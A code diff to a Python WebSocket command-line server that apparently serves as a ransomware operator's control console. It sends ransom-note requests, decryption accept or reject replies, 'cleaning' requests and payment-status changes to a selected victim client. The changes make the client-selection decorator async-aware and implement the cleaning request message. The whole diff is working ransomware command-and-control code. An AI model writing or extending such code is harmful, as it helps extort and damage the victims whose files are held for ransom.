@@ -1,7 +1,8 @@
 import asyncio
 import websockets
-from Connection import Connection, ConnectionState
 import json
+import inspect
+from Connection import Connection, ConnectionState
 
 class WebSocketCLIServer:
     def __init__(self, host="localhost", port=8765):
@@ -125,10 +126,10 @@ class WebSocketCLIServer:
                     await self.__send_ransom_note_req()
 
                 case ["decryptrep", *args]:
-                    await self.__send_decrypt_rep(args)
+                    status_args = args if len(args) > 0 else []
+                    await self.__send_decrypt_rep(status_args)
 
                 case ["cleaningreq"]:
-                    print("Not implemented yet")
                     await self.__send_cleaning_req()
 
                 case ["exit"] | ["quit"]:  
@@ -191,12 +192,23 @@ class WebSocketCLIServer:
     
     def check_selected_client(func):
         """Decorator to ensure a client is selected before running the method."""
-        def wrapper(self, *args, **kwargs):
-            if getattr(self, "_WebSocketCLIServer__selected_client", None) is None:
-                print("No client selected. Use 'select <username>' to select a client.")
-                return
-            return func(self, *args, **kwargs)
-        return wrapper
+        if inspect.iscoroutinefunction(func):
+            async def wrapper(self, *args, **kwargs):
+                if getattr(self, "_WebSocketCLIServer__selected_client", None) is None:
+                    print("No client selected. Use 'select <username>' to select a client.")
+                    return
+                return await func(self, *args, **kwargs)
+            return wrapper
+        else:
+            def wrapper(self, *args, **kwargs):
+                if getattr(self, "_WebSocketCLIServer__selected_client", None) is None:
+                    print("No client selected. Use 'select <username>' to select a client.")
+                    return
+                return func(self, *args, **kwargs)
+            return wrapper
+        
+    
+    
     
     @check_selected_client
     def __show_connection_info(self):
@@ -245,11 +257,11 @@ class WebSocketCLIServer:
         await self.__selected_client.send_message(json.dumps(message))
 
     @check_selected_client
-    async def __send_decrypt_rep(self, args=None):
+    async def __send_decrypt_rep(self, status_args=[]):
         """Send a decryption request to the selected client."""
         value = True
-        if len(args) > 0:
-            value = args[0].lower() == "true"
+        if len(status_args) > 0:
+            value = status_args[0].lower() == "true"
 
         message = {
             "type": "decryption_rep",
@@ -257,14 +269,17 @@ class WebSocketCLIServer:
                 "status": "accepted" if value else "rejected",
             }
         }
-        
+
         await self.__selected_client.send_message(json.dumps(message))
 
     @check_selected_client
     async def __send_cleaning_req(self):
         """Send a cleaning request to the selected client."""
-        #TODO: Implement cleaning request
-        pass
+        message = {
+            "type": "cleaning_req",
+            "data": {}
+        }
+        await self.__selected_client.send_message(json.dumps(message))
 
     @check_selected_client
     def __set_payment_status(self, status):
